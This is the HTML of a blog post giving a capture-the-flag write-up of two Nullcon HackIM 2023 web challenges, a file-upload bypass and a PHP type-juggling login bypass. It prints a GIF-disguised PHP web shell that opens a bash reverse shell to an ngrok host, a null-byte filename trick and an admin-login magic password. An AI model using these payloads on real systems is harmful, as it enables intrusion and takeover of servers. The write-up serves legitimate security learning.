@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Nullcon Goa HackIM CTF 2023Web&#x2F;Magic CarsChallenge OverviewDescription: Who doesn’t love Magical Cars? go checkout this cool website and even upload your fav gif to support it. Author: @moaath  W">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nullcon Goa HackIM CTF 2023">
+<meta property="og:url" content="http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/index.html">
+<meta property="og:site_name" content="j4ck4l&#39;s Blog">
+<meta property="og:description" content="Nullcon Goa HackIM CTF 2023Web&#x2F;Magic CarsChallenge OverviewDescription: Who doesn’t love Magical Cars? go checkout this cool website and even upload your fav gif to support it. Author: @moaath  W">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/nullcon/magic/index.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/nullcon/magic/flag.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/nullcon/typicalboss/index.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/nullcon/typicalboss/main.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/nullcon/typicalboss/database.png">
+<meta property="og:image" content="http://j4ck4l-24.github.io/images/nullcon/typicalboss/flag.png">
+<meta property="article:published_time" content="2024-05-14T10:20:19.793Z">
+<meta property="article:modified_time" content="2024-05-14T10:20:19.793Z">
+<meta property="article:author" content="j4ck4l">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://j4ck4l-24.github.io/images/nullcon/magic/index.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Nullcon Goa HackIM CTF 2023</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/14/corCTF23_Web_Writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&text=Nullcon Goa HackIM CTF 2023"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&is_video=false&description=Nullcon Goa HackIM CTF 2023"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Nullcon Goa HackIM CTF 2023&body=Check out this article: http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&name=Nullcon Goa HackIM CTF 2023&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&t=Nullcon Goa HackIM CTF 2023"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nullcon-Goa-HackIM-CTF-2023"><span class="toc-number">1.</span> <span class="toc-text">Nullcon Goa HackIM CTF 2023</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Magic-Cars"><span class="toc-number">2.</span> <span class="toc-text">Web&#x2F;Magic Cars</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag"><span class="toc-number">2.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-TYPicalBoss"><span class="toc-number">3.</span> <span class="toc-text">Web&#x2F;TYPicalBoss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview-1"><span class="toc-number">3.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification-1"><span class="toc-number">3.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability-1"><span class="toc-number">3.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag-1"><span class="toc-number">3.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Nullcon Goa HackIM CTF 2023
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">j4ck4l</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-14T10:20:19.793Z" class="dt-published" itemprop="datePublished">2024-05-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Nullcon-Goa-HackIM-CTF-2023"><a href="#Nullcon-Goa-HackIM-CTF-2023" class="headerlink" title="Nullcon Goa HackIM CTF 2023"></a>Nullcon Goa HackIM CTF 2023</h1><h1 id="Web-Magic-Cars"><a href="#Web-Magic-Cars" class="headerlink" title="Web&#x2F;Magic Cars"></a>Web&#x2F;Magic Cars</h1><h2 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h2><p>Description: Who doesn’t love Magical Cars? go checkout this cool website and even upload your fav gif to support it. Author: @moaath</p>
+<p><img src="/./images/nullcon/magic/index.png" alt="Index"></p>
+<p>We have been given a website <a target="_blank" rel="noopener" href="http://52.59.124.14:10021/">http://52.59.124.14:10021/</a>. We can see three options there. But only gallery seems to be interesting.</p>
+<p>So first let’s see the source code given.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>];</span><br><span class="line"><span class="variable">$uploadOk</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$files</span>[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$target_dir</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;images/&quot;</span> . <span class="variable">$files</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$target_dir</span>, <span class="string">&quot;..&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filesize</span>(<span class="variable">$files</span>[<span class="string">&quot;tmp_name&quot;</span>]) &gt; <span class="number">1</span> * <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Too big!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$target_dir</span>, PATHINFO_EXTENSION));</span><br><span class="line">    <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line">    <span class="variable">$type</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$files</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$extension</span> != <span class="string">&quot;gif&quot;</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$type</span>, <span class="string">&quot;image/gif&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot; Sorry, only gif files are accepted&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_dir</span> = <span class="title function_ invoke__">strtok</span>(<span class="variable">$target_dir</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$uploadOk</span> &amp;&amp; <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$files</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_dir</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;<span class="subst">$target_dir</span>&#x27;&gt;Uploaded gif here. Go see it!&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Vulnerability-Identification"><a href="#Vulnerability-Identification" class="headerlink" title="Vulnerability Identification"></a>Vulnerability Identification</h2><p>As we can see the code is checking MIME type when we upload a gif. This leads to file upload vulnerability.</p>
+<p>So adding gif header in the file the server can be easily exploited</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/file-upload">Reference</a></p>
+<h2 id="Exploiting-the-Vulnerability"><a href="#Exploiting-the-Vulnerability" class="headerlink" title="Exploiting the Vulnerability"></a>Exploiting the Vulnerability</h2><p>So to exploit this we will set the header of the file to <strong>GIF89a</strong>. And then we will inject some php code to exploit the server.</p>
+<p>We will name this file as <code>exploit.php%00.gif</code>. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.</p>
+<p>So to exploit this server we will try to get a shell using <strong>ngrok</strong></p>
+<p><code>exploit.php%00.gif</code> looks like:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/0.tcp.in.ngrok.io/16344 0&gt;&amp;1&#x27;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Obtaining-the-Flag"><a href="#Obtaining-the-Flag" class="headerlink" title="Obtaining the Flag"></a>Obtaining the Flag</h2><p>To retrieve the flag, we will use ngrok to get reverse shell.</p>
+<p>After uploading the file when we open it we get the shell.</p>
+<p>The flag is located in <code>/var/www/html</code> and is named <strong>flag.flag</strong>.</p>
+<p><img src="/./images/nullcon/magic/flag.png" alt="Flag"> </p>
+<p>Flag: <strong>ENO{4n_uplo4ded_f1l3_c4n_m4k3_wond3r5}</strong></p>
+<h1 id="Web-TYPicalBoss"><a href="#Web-TYPicalBoss" class="headerlink" title="Web&#x2F;TYPicalBoss"></a>Web&#x2F;TYPicalBoss</h1><h2 id="Challenge-Overview-1"><a href="#Challenge-Overview-1" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h2><p>Description: My boss just implemented his first PHP website. He mentioned that he managed to calculate a hash that is equal to 0??? I suppose he is not very experienced in PHP yet.<br>Author: @moaath</p>
+<p><img src="/./images/nullcon/typicalboss/index.png" alt="Index"></p>
+<p>We have been given a website <a target="_blank" rel="noopener" href="http://52.59.124.14:10022/index.php">http://52.59.124.14:10022/index.php</a>. The website includes a basic login page at the route <code>login.php</code>, which takes username and password as input.</p>
+<p>When we access the main directory ‘&#x2F;‘ of the website, we can see some files:</p>
+<p><img src="/./images/nullcon/typicalboss/main.png" alt="Main Directory"></p>
+<p>The file that catches our interest is <code>database.db</code>. If we open it with a database browser, we can see a list of usernames and their corresponding hashed passwords:</p>
+<p><img src="/./images/nullcon/typicalboss/database.png" alt="Database"></p>
+<h2 id="Vulnerability-Identification-1"><a href="#Vulnerability-Identification-1" class="headerlink" title="Vulnerability Identification"></a>Vulnerability Identification</h2><p>As we observe the hashed passwords, we notice that password of admin starts with ‘0e’. This is a common vulnerability in PHP, where the hashed password is interpreted as 0 instead of the actual hash value ‘0e12345678912345678920202020202020202020’.</p>
+<h2 id="Exploiting-the-Vulnerability-1"><a href="#Exploiting-the-Vulnerability-1" class="headerlink" title="Exploiting the Vulnerability"></a>Exploiting the Vulnerability</h2><p>To exploit this vulnerability, we need to find a value whose SHA-1 hash starts with ‘0e’. One common technique for this is known as Type Juggling. More details about this technique can be found <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md">here</a>.</p>
+<p>For instance, the SHA-1 hash of ‘10932435112’ starts with ‘0e’, so in PHP, it will be interpreted as 0.</p>
+<h2 id="Obtaining-the-Flag-1"><a href="#Obtaining-the-Flag-1" class="headerlink" title="Obtaining the Flag"></a>Obtaining the Flag</h2><p>To retrieve the flag, we need to log in with the username ‘admin’ and the password ‘10932435112’:</p>
+<p>Username: admin<br>Password: 10932435112</p>
+<p>Flag: <strong>ENO{m4ny_th1ng5_c4n_g0_wr0ng_1f_y0u_d0nt_ch3ck_typ35}</strong></p>
+<p><img src="/./images/nullcon/typicalboss/flag.png" alt="Flag"></p>
+<p>Thank You</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nullcon-Goa-HackIM-CTF-2023"><span class="toc-number">1.</span> <span class="toc-text">Nullcon Goa HackIM CTF 2023</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Magic-Cars"><span class="toc-number">2.</span> <span class="toc-text">Web&#x2F;Magic Cars</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag"><span class="toc-number">2.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-TYPicalBoss"><span class="toc-number">3.</span> <span class="toc-text">Web&#x2F;TYPicalBoss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview-1"><span class="toc-number">3.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification-1"><span class="toc-number">3.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-the-Vulnerability-1"><span class="toc-number">3.3.</span> <span class="toc-text">Exploiting the Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag-1"><span class="toc-number">3.4.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&text=Nullcon Goa HackIM CTF 2023"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&is_video=false&description=Nullcon Goa HackIM CTF 2023"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Nullcon Goa HackIM CTF 2023&body=Check out this article: http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&title=Nullcon Goa HackIM CTF 2023"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&name=Nullcon Goa HackIM CTF 2023&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://j4ck4l-24.github.io/2024/05/14/Nullcon_Goa_HackIM_CTF23_Writeup/&t=Nullcon Goa HackIM CTF 2023"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    حقوق النشر &copy;
+    
+    
+    2024
+    j4ck4l
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
